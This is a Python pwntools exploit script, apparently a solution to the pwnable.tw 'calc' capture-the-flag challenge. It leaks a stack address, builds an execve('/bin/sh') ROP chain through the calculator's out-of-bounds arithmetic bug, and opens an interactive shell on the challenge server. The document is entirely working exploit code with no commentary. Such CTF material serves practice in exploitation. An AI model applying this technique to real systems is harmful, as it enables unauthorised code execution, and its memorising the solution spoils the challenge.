from pwn import *

context.binary=elf=ELF('./calc')

p=remote("chall.pwnable.tw", 10100)
p.recvline()
p.sendline(b'+360')
main_ebp=int(p.recvline())
print(hex(main_ebp&0xffffffff))
int_0x80=0x08049a21 
pop_eax=0x0805c34b
pop_edx_ecx_ebx=0x080701d0

rop=[pop_edx_ecx_ebx,0,0,main_ebp,pop_eax,0xb,int_0x80,u32(b'/bin'),u32(b'/sh\x00')]
offset=361
for addr in rop:
    payload='+'+str(offset)
    p.sendline(payload.encode())
    leak=int(p.recvline())
    if addr>leak:
        payload+='+'+str(addr-leak)
    else:
        payload+='-'+str(leak-addr)
    p.sendline(payload.encode())
    v=int(p.recvline())
    assert(v==addr)
    offset+=1

p.interactive()
